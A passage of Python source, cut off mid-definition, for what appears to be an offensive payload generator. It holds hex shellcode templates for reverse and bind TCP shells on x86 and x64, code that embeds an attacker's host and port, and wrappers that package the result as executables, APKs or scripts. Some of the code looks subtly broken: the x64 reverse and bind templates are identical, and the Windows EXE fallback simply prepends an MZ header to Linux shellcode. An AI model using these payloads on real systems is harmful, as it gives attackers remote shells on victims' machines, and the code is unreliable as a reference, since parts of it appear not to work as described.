import struct
import socket
import os
from typing import Dict, Any, Optional
from pathlib import Path

class PayloadGenerator:
    """Generate architecture-aware payloads with multiple output formats"""

    SHELLCODE_TEMPLATES = {
        "x86": {
            "reverse_tcp": (
                b"\x31\xc0\x50\x50\x50\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb3\x01"
                b"\xb0\x66\xcd\x80\x89\xc6\x31\xdb\x53\x68"
            ),
            "bind_tcp": (
                b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
                b"\x5b\x5e\x52\x68\x02\x00"
            )
        },
        "x64": {
            "reverse_tcp": (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
                b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
                b"\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66"
                b"\xc7\x44\x24\x02"
            ),
            "bind_tcp": (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
                b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
                b"\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66"
                b"\xc7\x44\x24\x02"
            )
        }
    }

    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / "data" / "shellcode"

    def generate(self, payload_type: str, arch: str = "x64",
                 lhost: str = "127.0.0.1", lport: int = 4444,
                 **kwargs) -> bytes:
        """Generate raw shellcode payload"""

        if arch not in self.SHELLCODE_TEMPLATES:
            raise ValueError(f"Unsupported architecture: {arch}")

        if payload_type not in self.SHELLCODE_TEMPLATES[arch]:
            raise ValueError(f"Unsupported payload type: {payload_type}")

        base = self.SHELLCODE_TEMPLATES[arch][payload_type]

        # Embed LHOST and LPORT
        if payload_type == "reverse_tcp":
            ip_bytes = socket.inet_aton(lhost)
            port_bytes = struct.pack(">H", lport)

            if arch == "x64":
                payload = base + port_bytes + ip_bytes
                payload += b"\x4c\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05"
                payload += b"\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05"
                payload += b"\x75\xf6\x48\x31\xff\x57\x5e\x6a\x3b\x58\x99\x0f\x05"
            else:
                payload = base + ip_bytes + port_bytes
                payload += b"\x89\xe1\xb0\x66\x6a\x03\x5b\x6a\x10\x51\x56\x89\xe1"
                payload += b"\xcd\x80\x87\xf3\x87\xce\x49\xb0\x3f\xcd\x80\x49\x79\xf9"
                payload += b"\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
                payload += b"\x89\xe3\x41\x89\xd1\xcd\x80"

        elif payload_type == "bind_tcp":
            port_bytes = struct.pack(">H", lport)

            if arch == "x64":
                payload = base + port_bytes
                payload += b"\x4c\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x31\x58\x0f\x05"
                payload += b"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x31\xf6"
                payload += b"\x6a\x02\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48"
                payload += b"\x31\xff\x57\x5e\x6a\x3b\x58\x99\x0f\x05"
            else:
                payload = base + port_bytes
                payload += b"\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x52"
                payload += b"\x52\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xe1"
                payload += b"\xb0\x6a\xcd\x80\xb0\x01\xb3\x04\xcd\x80"

        return payload

    def format_payload(self, raw: bytes, fmt: str, **kwargs) -> bytes:
        """Format raw payload to specific output format"""

        if fmt == "raw":
            return raw

        elif fmt == "exe":
            return self._to_exe(raw, **kwargs)

        elif fmt == "elf":
            return self._to_elf(raw, **kwargs)

        elif fmt == "apk":
            return self._to_apk(raw, **kwargs)

        elif fmt == "python":
            return self._to_python(raw)

        elif fmt == "powershell":
            return self._to_powershell(raw)

        elif fmt == "csharp":
            return self._to_csharp(raw)

        else:
            raise ValueError(f"Unsupported format: {fmt}")

    def _to_exe(self, shellcode: bytes, **kwargs) -> bytes:
        """Wrap shellcode in Windows PE executable"""
        try:
            import pefile
            pe_data = self._build_minimal_pe(shellcode)
            return pe_data
        except ImportError:
            loader = b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
            return loader + shellcode

    def
